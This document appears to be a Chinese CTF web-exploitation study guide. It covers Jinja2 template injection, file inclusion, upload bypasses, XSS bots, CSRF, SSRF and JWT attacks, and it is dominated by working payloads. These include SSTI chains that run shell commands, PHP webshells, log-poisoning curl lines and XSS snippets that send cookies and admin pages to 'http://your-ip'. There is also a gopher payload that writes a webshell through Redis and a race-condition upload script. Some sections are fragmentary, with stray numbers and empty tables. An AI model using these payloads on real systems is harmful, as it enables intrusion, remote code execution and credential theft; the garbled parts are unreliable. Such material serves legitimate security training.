Jinja2 没有内置的"执行命令"能力，但它能访问 Python 的对象体系，顺着对象模型爬就能爬到 os 模块。

利用链的原始形态（背下这条链，其他变体都是它的别名）：

1{{ ''.__class__ }}                  # <class 'str'>          拿到 str 类
2{{ ''.__class__.__mro__ }}          # (str, object, ...)     拿到父类元组
3{{ ''.__class__.__mro__[1] }}       # <class 'object'>
4{{ ''.__class__.__mro__[1].__subclasses__() }}   # 列出所有已加载的子类

有了"所有子类列表"，就在里面找能执行命令的类——最常用的是 subprocess.Popen 或 os._wrap_close：

1# 方式一：找到 subprocess.Popen 后用下标调它（下标因环境而异，先用
2#   {{''.__class__.__mro__[1].__subclasses__()}} 打印出来数一数）
3{{''.__class__.__mro__[1].__subclasses__()[<下标>]('ls', shell=True, stdout=-1).communicate()[0].decode()}}
4
5# 方式二：找 os._wrap_close（它有 __init__.__globals__ 里带 os 模块）
6{{''.__class__.__mro__[1].__subclasses__()[<下标>].__init__.__globals__['os'].popen('ls').read()}}

3. Jinja2 的过滤绕过（重点）

出题人一定会过滤东西，常见就这几类，对付办法也很固定：

（1）下划线 _ 和点 . 被过滤

 1# 用 |attr() 代替点号
 2{{ ''|attr('__class__') }}
 3{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1) }}
 4
 5# 用十六进制绕下划线（注意：这是构造字符串，最终 payload 里不含 _ ）
 6{{ ''['\x5f\x5fclass\x5f\x5f'] }}
 7{{ (lipsum|attr('\x5f\x5fglobals\x5f\x5f')) }}
 8
 9# 用 request.args 从 URL 里带参数进来（彻底不写字符串）
10#   payload:  {{ lipsum|attr(request.args.a)|attr(request.args.b) }}
11#   url:      ?a=__globals__&b=os

（2）关键字（os、system、popen）被过滤

11

（3）引号被过滤（最常见的！）

1# 彻底不用引号，全靠 request 对象带参
2#   {{ lipsum.__globals__[request.args.a].popen(request.args.b).read() }}
3#   ?a=os&b=cat /flag
4
5# 或者从已有字符串里"切片"出需要的字符
6{{ ()|attr(request.args.a) }}
7{{ (request.values|join)|attr('__class__') }}

（4）{{ }} 被过滤 / 只能写 {% %}

1# 用语句块回显
2{% print(lipsum.__globals__.os.popen('ls').read()) %}

第四章：核心漏洞 - 文件操作篇 (File Operations)

这一章的通用心法：文件操作题的答案，往往在"找一个能让服务器读到/写到我想读的文件的方法"。 包含是"让服务器替我读"，上传是"让服务器替我存"。两者经常组合使用。

文件包含 (LFI/RFI)

原理：当"包含哪个文件"由用户参数决定时，攻击者就能让服务器去包含任意文件——包括它自己的源码、系统文件、日志、甚至远程的恶意代码。

1. 四个包含函数的区别

函数 文件不存在时 执行次数 使用场景
include 报 Warning，继续执行 可多次 普通模板加载
require 报 Fatal error，停止执行 可多次 核心文件
include_once 同 include 只一次 防重复定义
require_once 同 require 只一次 防重复定义

为什么要知道这个：如果题目用的是 include，那即使包含的文件不存在，后续代码还会继续跑——这可能给你留下"报错回显路径"的机会（路径泄露）。如果用的是 require，包含失败就直接 500 了。

2. 第一步：找到可疑参数并试探

常见的参数名（扫目录的时候顺手试试）：

1?file=  ?page=  ?path=  ?tpl=  ?template=  ?lang=  ?module=  ?include=  ?require=  ?view=  ?url=

试探顺序（从最无害的开始，避免把题目搞崩）：

 1# 1. 先确认参数控制的是文件包含（相对路径试探）
 2?file=index.php          # 正常回显
 3?file=1.php              # 报错：Failed opening required '1.php' —— 出现了路径提示！
 4?file=../../../../etc/passwd      # 出现 root:x:0:0 —— 恭喜，LFI 到手
 5
 6# 2. 确认是否支持远程包含（RFI）
 7?file=http://your-server.com/shell.txt
 8
 9# 3. 如果不回显，试试读自己的源码
10?file=php://filter/read=convert.base64-encode/resource=index.php

报错信息就是藏宝图：Failed opening required 'xxx' (include_path='.:/usr/share/php') 这类报错会告诉你当前目录和 include_path，从而算出要往上跳几层才能到根目录。

3. 路径穿越深度

从网站根目录（比如 /var/www/html/）到 /etc/passwd 需要 ../ 的层数取决于当前脚本的位置：

1/var/www/html/index.php  →  ../../../../etc/passwd

不知道几层怎么办？ 有这几种偷懒的办法：

方法 Payload 说明
多打几层 ../../../../../../../../etc/passwd Linux 下超过根目录的 .. 会被忽略，多写无害，这是最通用的做法
绝对路径 /etc/passwd 直接给绝对路径往往更好使
用 /proc/self/cwd /proc/self/cwd/../../../etc/passwd 从当前工作目录出发
从环境变量里看路径 结合 phpinfo() 或报错信息 最稳

小技巧：“多打几层"是无脑首选。 因为 Linux 内核在解析路径时，/.. 到达 / 后再 .. 还是 /，所以 ../../../../../../../../etc/passwd 和 ../../../../etc/passwd 效果一样。Windows 就没这好事了，得老老实数。

4. PHP 伪协议总览（这一节是文件包含的核心）

协议 作用 前提条件 典型 Payload
file:// 读本地文件 无特殊要求 file:///etc/passwd
php://filter 读文件源码（不执行） 无特殊要求 php://filter/read=convert.base64-encode/resource=index.php
php://input 把 POST 请求体当代码执行 allow_url_include=On POST 体里写 <?php system('ls');?>
data:// 直接在 URL 里写代码 allow_url_include=On data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+

优先级：php://filter 是第一顺位，因为它不需要任何配置就能读源码。php://input 和 data:// 需要 allow_url_include=On（默认关），但很多 CTF 题目会特意打开。

5. php://filter 深度用法

为什么读源码要 base64？ 因为如果你直接包含 index.php，PHP 会把源码当代码执行，你还是看不到源码。convert.base64-encode 过滤器把它编码成一段无毒无害的 base64 文本，输出出来就是源码。

 1# 基础读取
 2?file=php://filter/read=convert.base64-encode/resource=index.php
 3
 4# 如果 "convert" 或 "base64" 被过滤了，可以用完整路径/大小写/多重过滤绕
 5?file=php://filter/read=convert.base64-encode/resource=index
 6?file=php://filter/read=CONVERT.BASE64-ENCODE/resource=index.php
 7?file=php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php
 8
 9# 读别的文件（配合包含位置：所有被包含的兄弟文件都值得读）
10?file=php://filter/read=convert.base64-encode/resource=flag.php
11?file=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd

解码：拿到 base64 后直接在终端解码：

1echo "PD9waHAgZWNobyAiSGVsbG8iOz8+" | base64 -d

常用过滤器速查：

过滤器 作用
convert.base64-encode base64 编码（读源码首选）
convert.base64-decode base64 解码
string.strip_tags 去掉 HTML 标签，可用于绕过一些检查
convert.quoted-printable-encode 引号可打印编码，有时可绕过滤
convert.iconv.XXX.YYY 字符集转换，常用于绕过对"内容里有 php 字符"的检查，也能造出绕过死亡退出的 payload
zlib.deflate / zlib.inflate 压缩/解压
consumed 配合 resource=，可用于绕过"必须包含数据流"的限制

进阶：convert.iconv 过滤器链能造出**“没有字母数字的 payload”**，用于绕过死亡退出（exit()）和内容过滤。搜关键词 php filter chain generator，有现成工具可以直接生成。

6. php://input 与 data://

1# php://input：POST 请求体被当作 PHP 代码执行
2POST /?file=php://input
3Content-Type: application/x-www-form-urlencoded     # 也可以不写
4
5<?php system('cat /flag');?>
6# 或者更省的短标签写法：
7<?=`cat /flag`?>

1# data://：把代码直接写在 URL 里

7. zip:// 与 phar://（配合文件上传）

这两个是**“上传 + 包含"组合拳**的关键：很多题目只允许你上传图片，但你可以把 PHP 代码塞进一个压缩包里（zip 文件头能过"文件头检查”）。

1# 1. 本地生成一个"内含 shell 的压缩包"
2echo '<?php system($_GET["c"]); ?>' > shell.php
3zip shell.jpg shell.php        # 注意：压缩包本身叫 shell.jpg，能过图片后缀检查
4
5# 2. 上传得到路径 /tmp/upload/shell.jpg
6
7# 3. 用 zip:// 包含它里面的 shell.php
8?file=zip:///tmp/upload/shell.jpg%23shell.php

注意 %23：# 在 URL 里是锚点，必须编码成 %23 才能表示"压缩包内的文件名"这个分隔符。这是 zip:// 最容易卡住的地方。

1# phar:// 同理（phar 必须用 phar 文件格式，可以用工具生成）
2?file=phar:///tmp/upload/a.phar/shell.php

phar 的真正杀招：phar:// 在解析文件元数据时会自动反序列化，也就是说——只要你能让服务器执行到一个 phar:// 路径（哪怕不是 include，是 file_exists、filesize、getimagesize 这种"看似无害"的函数），就能触发反序列化漏洞。这是第六章 PHP 反序列化的重要联动点。

8. 日志包含 GetShell

原理：Apache/Nginx 会把每个请求（包括 User-Agent、Referer）写进访问日志。如果能包含日志文件，就等于把 PHP 代码写进了日志，再把它当代码执行。

1# 1. 先确定日志路径（Linux 常见位置）
2/var/log/apache2/access.log
3/var/log/httpd/access_log
4/var/log/nginx/access.log
5/var/log/nginx/access_log
6/usr/local/apache2/logs/access_log
7/var/log/sshd.log  /var/log/auth.log      # SSH 登录日志

1# 2. 在 User-Agent 里写入 PHP 代码（用 Burp 改包，或 curl 指定 UA）
2curl -A "<?php system('cat /flag'); ?>" http://target/

1# 3. 包含日志文件执行
2?file=/var/log/nginx/access.log

避坑：日志会转义引号，所以别在 payload 里用引号：

1<?=system($_GET[0])?>       <!-- ✅ 不带引号 -->
2<?php system('ls'); ?>      <!-- ❌ 引号会被转义成 \"，代码就崩了 -->

那 $_GET[0] 怎么读文件？用反引号或者 $_GET[0] 里传命令…… 其实更常见的是写成 <?=cat /flag?>（反引号也会被转义，所以最终常用的是不带任何引号的函数调用）。

备选文件 说明

9. Session 文件包含

原理：PHP 把 session 存成文件（默认 /tmp/sess_<sessionid>），而 session 里的内容往往来自用户可控的输入。

1# 1. 找到 session 文件路径（phpinfo 里的 session.save_path，常见是 /tmp 或 /var/lib/php/sessioins）
2# 2. 找一个"能把用户输入写进 session"的功能（比如登录页的用户名、任何存进 session 的参数）
3# 3. 把 payload 写进 session
4POST /login
5username=<?php system('cat /flag'); ?>&password=1
6
7# 4. 带上自己的 PHPSESSID 去包含 session 文件
8?file=/tmp/sess_abc123
9Cookie: PHPSESSID=abc123

判断技巧：如果 session 文件里存的是 username|s:30:"<?php ..."; 这种序列化格式，那你写入的 payload 前后会有脏字符。在 payload 前后加 ; 或者用 <?= 短标签+不带引号，通常还能正常执行。

文件上传 (File Upload)

原理：题目允许你上传文件，但过滤不严或服务器配置有问题，导致你能上传一个"能被当代码执行"的文件，从而 getshell。

1. 上传题的第一反应

拿到上传点，先做一个"无害测试”（这一步价值极高，别跳过）：

  1. 传一个正常的小图片，看返回什么：有没有回显上传后的路径？路径规律是什么？
  2. 访问这个路径，确认文件真的能访问（有些题上传到不可访问的目录，那上传漏洞就没意义了）。
  3. 传一个改名后的 txt，看服务器怎么处理后缀：是拒绝？是改后缀？是保留原名？
  4. 最后才是想方设法让"我的文件被执行"。

关键判断：上传漏洞的成败，90% 取决于"上传后的文件能不能被解析为 PHP"。所以思路永远是两条腿走路：

  • 路 A：让 PHP 文件过校验（绕过检测）
  • 路 B：让非 PHP 文件能被执行（解析漏洞/配置文件）

2. 第一关：前端 JS 校验

识别：上传非法文件时，弹窗或在浏览器控制台报错，而且Burp 里根本没抓到这个请求——这说明校验发生在浏览器本地。

绕过：三个办法任选

办法 操作

改前端代码 F12 → Sources，找到校验函数，把 onsubmit 改成 return true

2function check() {
3    var f = document.getElementById('file').value;
4    if (!/\.(jpg|png|gif)$/i.test(f)) { alert('只能上传图片'); return false; }
5    return true;
6}

小技巧：改包时注意——文件名本身才是重点。常见操作是在 Burp 里把

1Content-Disposition: form-data; name="file"; filename="a.jpg"

改成 filename="a.php"，其他保持原样。

3. 第二关：MIME 类型（Content-Type）校验

识别：前端过了，但请求被拒，且错误提示里没有"文件内容/后缀"字样。

原理：浏览器上传时会自动带上 Content-Type，服务端只信这个头。

4. 第三关：文件头（幻数）校验

识别：改了 MIME 还是被拒，提示里出现"图片内容不合法"之类。

原理：服务端读文件的前几个字节，判断是不是真图片。

绕过：直接在 PHP 文件开头加上合法的文件头。

1GIF89a
2<?php eval($_POST[1]); ?>

6. .htaccess 与 .user.ini（最优雅的绕过）

核心思想：既然我传上去的 .jpg 不能执行，那我就上传一个"配置文件"，让服务器把 .jpg 当 PHP 执行。

（1）Apache 的 .htaccess

 1# 把 .jpg 当成 PHP 来解析
 2AddType application/x-httpd-php .jpg
 3
 4# 或者用 SetHandler
 5<FilesMatch "\.jpg$">
 6    SetHandler application/x-httpd-php
 7</FilesMatch>
 8
 9# 老版本写法
10AddHandler application/x-httpd-php .jpg
11
12# 还有一种：把整个目录里的所有文件都当 php（更暴力）
13SetHandler application/x-httpd-php

传上去以后，再传一个内容为 PHP 代码的 .jpg，然后访问它，就被当 PHP 执行了。

注意：.htaccess 只有 Apache 认，而且要求 AllowOverride All（默认常常是 None）。Nginx 完全不认这个文件。所以先判断中间件，再决定用不用这一招。

（2）PHP 的 .user.ini

PHP 从 5.3 开始支持在每个目录放一个 .user.ini，其中 auto_prepend_file 的意思是在"所有 PHP 文件执行前，先自动包含某个文件"。

1auto_prepend_file=shell.jpg

用法：

  1. 上传 .user.ini，内容为 auto_prepend_file=shell.jpg。
  2. 上传 shell.jpg，内容是 <?php system($_GET[1]); ?>。
  3. 访问同目录下任意 PHP 文件（比如 index.php）——它在执行前会先包含 shell.jpg，于是你的代码就跑了。

对比记忆：

  • .htaccess → 让 jpg 本身能执行，需要 Apache。
  • .user.ini → 让 php 文件执行前先带上我的代码，需要 PHP 以 CGI/FastCGI 模式运行。

两个都是"不直接上传 shell，而是上传一个改变服务器行为的配置“的思路。

8. 条件竞争 (Race Condition)

场景：服务器把上传的文件先存到服务器，然后再检查/删除。也就是存在一个"文件已经存在，但还没被删除"的时间窗口。

1// 典型的漏洞逻辑
2move_uploaded_file($tmp, UPLOAD_DIR . $name);   // 1. 先落地
3if (!check($name)) { unlink(UPLOAD_DIR . $name); }  // 2. 再检查、不合规就删

利用思路：在"落地"和"删除"之间，用一个死循环的高频请求去访问这个文件，一旦命中就执行了我们的代码。

利用脚本骨架：

 1import requests, threading
 2
 3url = "http://target/upload.php"
 4target = "http://target/uploads/shell.php"
 5
 6def upload():
 7    while True:
 8        # 反复上传（注意每次都用同一个文件名，才能猜到路径）
 9        requests.post(url, files={'file': ('shell.php', open('shell.php','rb'), 'image/png')})
10
11def access():
12    while True:
13        r = requests.get(target)
14        if r.status_code == 200 and 'success' in r.text:
15            print("命中！", r.text); break
16
17threading.Thread(target=access).start()
18for _ in range(10):
19    threading.Thread(target=upload).start()

更"高级"的一类竞争：利用临时文件包含。有些题目上传后会给你一个 php://temp 或临时文件路径（比如 ?file=/tmp/phpXXXXXX），你可以在文件被删除前用 LFI 包含它。这种题通常要写脚本同时上传 + 包含。

条件竞争的判断特征：题目源码里同时出现了 move_uploaded_file（或 file_put_contents）和 unlink / rename。看到"先存后删"，就是条件竞争。

9. 解析漏洞（让非 PHP 文件被执行）

这些是服务器配置的历史遗留问题，一旦命中，你传个 a.jpg 里带 PHP 代码就能直接跑。

（1）Apache 多后缀解析

1Apache 认为 a.php.jpg 的"真正后缀"是从右往左第一个"认识的后缀"，
2所以 a.php.jpg 会被当 PHP 执行。

实际上取决于具体配置（AddHandler 时代的特性：AddHandler application/x-httpd-php .php 会让任何文件名里含有 .php 的都被当 PHP 处理）。关键判据是 httpd.conf 里的 AddHandler 或 AddType 写法——遇到 Apache 题目，a.php.jpg 值得一试。

（2）Nginx + PHP-FPM 配置错误（最经典）

如果 nginx.conf 里是这种错误写法（只要路径里出现 .php 就交给 PHP 处理）：

1location ~ \.php {
2    fastcgi_pass 127.0.0.1:9000;
3}

那么：

1/uploadfiles/a.jpg/x.php      →  实际读取 a.jpg，但被当 PHP 执行
2/uploadfiles/a.jpg%00.php
3/uploadfiles/a.jpg/.php

经典利用链（CVE 类型的经典题）：

  1. 上传一个名为 a.jpg 的图片马（或纯文本），内容为 <?php system($_GET[1]); ?>。
  2. 访问 /upload/a.jpg/x.php。
  3. Nginx 匹配到 .php，把 a.jpg 交给 PHP-FPM 执行。
  4. 因为 PHP-FPM 有个 fix_pathinfo 特性（早期默认开启），它会把 /x.php 当成 PATH_INFO 丢掉，实际执行 a.jpg 的内容。

这个链在 security.limit_extensions 默认开启后基本失效，但作为经典考点必须认识。

（3）IIS

IIS 版本 特性 利用
IIS 6.0 分号 ; 后面的内容被忽略 a.asp;.jpg 被当 ASP 执行
IIS 6.0 目录解析 /a.asp/1.jpg 被当 ASP 解析
IIS 7.x FastCGI 配置错误 a.jpg/.php 同 Nginx
IIS 7.5+ (老) 短文件名 a~1.txt 可以访问到 abcdefghij.txt

（4）其他中间件

中间件 特性

10. 上传题的"组合技"

上传很少单独出现，它几乎总是和别的漏洞连起来用：

组合 打法
上传 + 文件包含 上传一个内容为 PHP 的图片/txt，再用 LFI 包含它执行（最经典，因为上传点常常"只给存不给执行"，但包含点可以执行任意文件）

第五章：客户端与认证安全 (Client-side & Auth)

这一章的共同点：漏洞的"受害者"不是服务器，而是其他用户或服务器的信任关系。XSS 骗的是别的浏览器，CSRF 骗的是服务器对浏览器的信任，SSRF 骗的是服务器对内网的信任。

大写字母 用 JSFuck（纯 []()!+ 构成任意代码）
关键字替换为空 双写：<scscriptript>

小技巧：<svg/onload=alert(1)> 里用 / 代替空格，是绕过"空格过滤"的经典写法。

小技巧：如果 < > 都被过滤了，去看目标页面上有没有已经存在的标签可以借用属性，比如 <input value="你的输入">，那你只需要构造 " onmouseover=alert(1) x=" 就够了。

4. CSP（内容安全策略）绕过

CSP 是什么：服务器通过响应头告诉浏览器"只准执行来自这些地方的脚本"。

1Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-abc123' https://cdn.example.com

常见 CSP 指令：

指令 含义
script-src 允许的 JS 来源
unsafe-inline 允许内联脚本（有这个 CSP 基本等于没有）
nonce-xxx 只有带这个随机数的 script 标签能执行
strict-dynamic 允许被信任脚本动态创建的脚本
default-src 兜底规则
object-src 'none' 禁止插件，防老式绕过
base-uri 限制 <base> 标签

逐个绕过思路：

CSP 配置 绕过手法
unsafe-inline 存在 直接打，等于没 CSP
有 nonce ① 复用页面里已有的 nonce（很多题的 nonce 是固定值！）；② 利用 /proc/self 之类的路径包含注入 nonce；③ 如果有"用户内容被插进 script 标签"的点，就不用自己写 script 标签了
有 strict-dynamic 找一个被信任的脚本能加载的攻击点（如 JSONP 端点）
script-src 允许某 CDN 去这个 CDN 上找托管了 JS 的接口（比如 cdn.com/jsonp?callback=alert(1)）
允许 'self' 找站内的 JSONP 端点：/api?callback=alert(1)；或者利用文件上传传一个 .js 到同源
unsafe-eval 存在 配合 AngularJS 之类的库做沙箱逃逸
只允许特定域 找被允许域上的重定向，或者 <base href> 注入

用你自己的那道题做例子（AFCTF 2021 BABY_CSP）：页面给了 <script nonce=29de6fde0db5686d>，注入点只能回显到 <p> 里。解法不是绕 CSP，而是发现这个 nonce 是写死的、不变的——所以直接构造 <script nonce="29de6fde0db5686d">alert(flag);</script> 就过了。

这就是 CSP 题最常见的两个套路：要么 nonce 固定可复用，要么 nonce 可被注入/泄露。 先看 nonce 有没有变，是测试的第一步。

另一个高频套路：CSP Report 泄露。

1Content-Security-Policy-Report-Only: ...; report-uri /csp-report

如果你能让页面主动触发违规，报告里会带上被拦截的 URL 和部分内容——有时 flag 就藏在里面。CTF 中出现形式通常是"给你一个 xss 点，flag 在某个页面里，直接看会被 CSP 挡，靠 report 外带"。

5. XSS Bot 题（最典型的 CTF XSS 形态）

题目形态：

有一个留言板/反馈功能。你提交内容后，管理员（一个用 Robot/Headless Chrome 实现的 Bot）会带着 flag 或管理员 Cookie 来访问你的内容。偷到它就是你赢。

标准解题套路：

第一步：确认"谁来看、看什么"。通常题目会给你一个"Bot 会访问的 URL 提交框"，你提交一个 URL，Bot 带着 Cookie 去访问。flag 一般不在 Cookie 里，而在管理员才能访问的某个页面里。

第二步：确认能否出网。这是最关键的判断：

能否出网 打法
能出网 直接把数据外带到你的服务器/DNSLog
不能出网 必须"曲线救国"：把数据写回你自己能看到的页面（比如留言板），然后再去读

第三步：写 payload。

 1<!-- 套路 A：偷 Cookie（出网） -->
 2<script>location='http://your-ip/?c='+document.cookie</script>
 3<img src=x onerror="fetch('http://your-ip/?c='+document.cookie)">
 4
 5<!-- 套路 B：读管理员页面再外带（出网）—— 出题最常见 -->
 6<img src=x onerror="fetch('/admin/flag').then(r=>r.text()).then(t=>fetch('http://your-ip/?d='+btoa(t)))">
 7
 8<!-- 套路 C：不出网 —— 把 flag 写回我自己的留言/资料页 -->
 9<img src=x onerror="fetch('/admin/flag').then(r=>r.text()).then(t=>fetch('/api/post',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:t})}))">
10
11<!-- 套路 D：先偷 CSRF token 再以管理员身份操作 -->
12<img src=x onerror="fetch('/admin').then(r=>r.text()).then(h=>{let m=h.match(/csrf[^>]*value=\"([^\"]+)/);fetch('/admin/do',{method:'POST',body:'csrf='+m[1]+'&action=giveflag'})})">

绕过 Bot 的常见限制：

限制 绕过
Bot 只访问 http 协议、且只能访问同域 用站内已有的 JSONP/重定向接口做跳板；或者用 <base>、相对路径
Bot 的 UA 或来源被检查 一般不用管，Bot 会带正常 Cookie
有 CSP 禁止外联 改成"把 flag 写回站内"（套路 C/D）
HttpOnly 让 document.cookie 拿不到 Cookie 偷不了，必须走"读取页面内容"的路子
Bot 访问有频率限制/排队 提交后耐心等（有的题要 30 秒以上）
Bot 会先做 XSS 检测（比如访问前先用正则扫一遍你的内容） 编码变形，或者把 payload 放到 <input> 属性里、用 \u003c 之类绕过

重要判断：HttpOnly 是分水岭。

  • 没有 HttpOnly → 偷 Cookie 就完事。
  • 有 HttpOnly → document.cookie 里看不到 flag 的 Cookie，必须读页面内容（思路 B/C/D 才是答案）。

看响应头 Set-Cookie: flag=xxx; HttpOnly，一眼就能定方向。

Headless 环境下的坑：

坑 说明
btoa 处理中文会崩 用 btoa(unescape(encodeURIComponent(t))) 或干脆 base64 前先 encodeURIComponent
fetch 被 CSP 限制 connect-src 改用 <img src> 或 <form> 提交（受 img-src/form-action 限制，但有时没配）
页面是异步渲染的 加 setTimeout，或者把 payload 放在 onload 里
Bot 一访问就退出，来不及发请求 用同步的 <img src=...> 而不是异步 fetch(...).then(...)（img 会在页面加载时立即发出）

最稳的外带写法（宁可慢，不要丢）：

1<img src=x onerror="
2  fetch('/admin/flag').then(r=>r.text()).then(t=>{
3    new Image().src='http://your-ip/?d='+encodeURIComponent(t);
4  })
5">

外带平台：ceye.io、dnslog.cn（看 DNS）、Burp Collaborator、webhook.site、以及你自己的 VPS + nc -lvnp 80。CTF 比赛里如果靶机在内网，公网 VPS 是必需品。

考点 说明

CSRF (跨站请求伪造)

原理：攻击者构造一个页面，让已经登录目标站点的受害者在不知情的情况下发出一个"受害者的合法请求"。服务器看到 Cookie 合法，就认了。

1. 成立条件（三个必须同时满足）

  1. 有状态变更的操作（改密码、转账、发帖）
  2. Cookie 能自动携带（基于 Cookie 的会话，且 SameSite 未设 Strict/Lax）
  3. 没有随机化校验（没有 CSRF token，或者 token 可预测）

2. 最基础的利用

1<!-- GET 型：最简单，直接 img -->
2<img src="http://target.com/change?email=attacker@evil.com">
3
4<!-- POST 型：用自动提交的隐藏表单 -->
5<form id="f" action="http://target.com/change" method="POST">
6    <input name="email" value="attacker@evil.com">
7</form>
8<script>document.getElementById('f').submit();</script>

注意：现代浏览器默认 SameSite=Lax，跨站的 POST 请求不会带 Cookie，所以上面这招在真实浏览器里常常失效。但CTF 的 Bot 往往用的是旧版配置或者题目自己关掉了 SameSite，所以还是要试。

别忘了 GET 型：SameSite=Lax 下，顶级导航的 GET 请求仍然会带 Cookie。所以只要有"GET 就能改数据"的接口，CSRF 照样成立。

3. Token 校验的绕过思路

CTF 里的 CSRF 题，考的往往不是"发请求"，而是"绕过 token 校验"：

绕过方式 说明
删除 token 参数 服务端逻辑写成了 if (isset($_POST['token']) && $_POST['token'] != $session_token) die(); ——没传 token 就直接放行了
token 为空 同上，传 token= 空值
使用别的用户的 token 服务器只校验"token 存在"，不校验"是不是这个用户的"
token 可预测 token 用时间戳/弱随机数生成，或者等于用户名 MD5
Method 转换 POST 有 token 校验，但 GET 没有（或反之）
Content-Type 转换 改成 application/json 或 text/plain，服务端就不走 token 校验分支了
Referer 校验绕过 见下一节
XSS 配合 有 XSS 就无所谓 CSRF 了——直接读页面里的 token 再发请求

4. Referer 校验绕过

服务端有时只检查 Referer 是不是自己域：

1Referer: http://target.com/xxx    ← 必须是自己的域
绕过 做法
子串匹配 http://target.com.evil.com/（因为代码常写成 strpos($ref,'target.com') !== false）
放进路径里 http://evil.com/target.com/
放进参数里 http://evil.com/?target.com
用 https 前缀 https://target.com.evil.com
空 Referer 用 <meta name="referrer" content="no-referrer">、或者从 https 页面发请求到 http 站点（浏览器会不带 Referer）
用自己域做跳转 找一个站内的重定向（?url=），从它跳过去

5. 顺带认识几个"同类"

漏洞 一句话区别
CSRF 借用户的浏览器发请求（不知道响应内容）
XSS 在用户浏览器里执行代码（能读响应内容）
SSRF 借服务器的身份发请求
点击劫持 (Clickjacking) 用透明的 iframe 骗用户点击（防护靠 X-Frame-Options / frame-ancestors）

SSRF (服务端请求伪造)

原理：服务器提供了"帮你访问某个 URL“的功能，而 URL 由用户控制。于是攻击者能让服务器去访问它本不该访问的地方——内网。

1. 常见触发点

功能 参数特征
图片加载/下载 ?url=、?image=、?img=、?src=
网页抓取/翻译/预览 ?url=、?uri=、?link=、?target=
Webhook / 回调 提交一个 URL 让服务器回调
文件上传的"远程导入” “从 URL 导入图片”
PDF/截图生成 ?html=、?page=
代理/转发 ?path=、?proxy=
数据库配置 ?host=、?db=、?redis=（比如"数据库连接测试"）

判断技巧：看到"服务器会主动访问一个我给的地址"的功能，立刻想到 SSRF。标志性参数是 url。

2. 先确认有没有 SSRF

最稳的验证方式：让你自己的服务器收到请求。

1# 在你自己的 VPS 上监听
2nc -lvnp 80
3python3 -m http.server 80

然后提交 http://your-ip:80/test。收到请求就是 SSRF，收不到再考虑是不是被 DNS 阻拦了（用 DNSLog 验证）。

判断端口的技巧：SSRF 无回显时，可以靠响应时间判断：

6. 利用四：打内网服务（Redis 是重灾区）

为什么打 Redis：Redis 未授权访问（无密码）+ 能写文件 + 能起主从复制 → 直接 getshell。

1# 1. 用 http:// 打 Redis？不行，Redis 不是 HTTP 协议，会报错。
2#    但报错信息本身就能确认"这是个 Redis"（有回显时）
3?url=http://127.0.0.1:6379
4
5# 2. 用 gopher:// 构造任意 TCP 数据包（关键武器！）
6?url=gopher://127.0.0.1:6379/_<URL编码后的Redis命令>

gopher 的规则（重点）：

  • gopher://host:port/_ 后面跟 URL 编码的原始数据（_ 后面是数据开始）
  • 换行用 %0d%0a（Redis 协议要求 CRLF）
  • 所有特殊字符都要 URL 编码（尤其 %0d%0a 必须能完整送达）

写 WebShell（最简版）：

1# Redis 命令：
2#   set x "\n\n<?php system($_GET[1]);?>\n\n"
3#   config set dir /var/www/html
4#   config set dbfilename shell.php
5#   save
6
7?url=gopher://127.0.0.1:6379/_set%20x%20%22%0d%0a%0d%0a%3C%3Fphp%20system(%24_GET%5B1%5D)%3B%3F%3E%0d%0a%0d%0a%22%0d%0aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml%0d%0aconfig%20set%20dbfilename%20shell.php%0d%0asave%0d%0a

避坑：Redis 的 config set dir 有时会因为权限不够失败（Redis 是以 redis 用户跑的）。可以换成 /var/spool/cron/（写计划任务）、/root/.ssh/（写公钥），或者用主从复制把恶意模块加载进来。

2# 直接上工具生成 payload（gopherus / 各种 fastcgi exp）
3python2 gopherus.py --exploit fastcgi

题目常常限制"只能访问某个域名"或者"禁止内网 IP"，绕过手法如下：

（1）黑名单 IP 的绕过

短写 IP http://127.1/、http://0/ 127.0.0.1 的等价写法
十进制 IP http://2130706433/ 127.0.0.1 的十进制表示

手法 示例

举几个"解析差异"的经典例子：

URL 过滤规则怎么想 请求库实际连谁

http://a.com/?x=b.com 包含两个 连 a.com
http://a.com\.b.com/ 包含 a.com 连 b.com（PHP 会把 \. 归一化）

8. 无回显 SSRF

手法 做法
DNSLog ?url=http://flag.your-dnslog.cn —— 有 DNS 请求就说明存在（验证阶段用）
带数据到 DNS 若能把文件内容拼进域名（需配合其他漏洞）

实战流程：第一步用 DNSLog 验证 SSRF 存在（成本最低）→ 第二步尝试有回显的读文件/探端口 → 第三步无回显时打 Redis/FPM。

认证与逻辑漏洞

2. JWT (JSON Web Token)

结构：三段用 . 连接，base64url 编码（不是加密！）。

1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJ1c2VyIjoiZ3Vlc3QifQ . 签名
2        ↓                                      ↓                  ↓
3    Header（算法）                        Payload（数据）        Signature

1// Header
2{ "alg": "HS256", "typ": "JWT" }
3// Payload
4{ "user": "guest", "role": "user", "exp": 1700000000 }

先做的事：把前两段 base64url 解码，看看到底有什么字段（role、isAdmin、uid、username——这些就是你要改的目标）。

1# 解码
2echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d
3# 或者直接上 jwt.io 网站看

六种攻击：

攻击 原理 做法
① 空算法（none） 服务端信任 Header 里的 alg，把 none 当成"不校验签名" 改 Header 为 {"alg":"none","typ":"JWT"}，把签名段留空。变体：none、None、NONE、nOnE（大小写都试一遍）
② 弱密钥爆破 密钥是字典词/简单数字 hashcat -m 16500 jwt.txt rockyou.txt 或 jwt_tool。CTF 里密钥常是 111、secret、key、password
③ 算法混淆（RS256 → HS256） 服务端用公钥验签，攻击者把算法改成 HMAC，用公钥当 HMAC 的密钥签 把 alg 改成 HS256，用泄漏的公钥作为密钥重签
④ kid 注入 kid（密钥 ID）被拿去拼路径/查 SQL "kid":"../../../../dev/null"（密钥变成空）、"kid":"' union select 'mykey'-- -"（SQL 注入控制密钥）、"kid":"/proc/sys/kernel/randomize_va_space"（密钥变成已知文件内容）
⑤ jwk / jku 注入 Header 里可以直接指定公钥，或者指定"去哪儿取公钥" "jwk":{...自己生成的公钥...}（服务端直接用你的公钥验签）、"jku":"http://your-ip/jwks.json"（指向你的服务器）
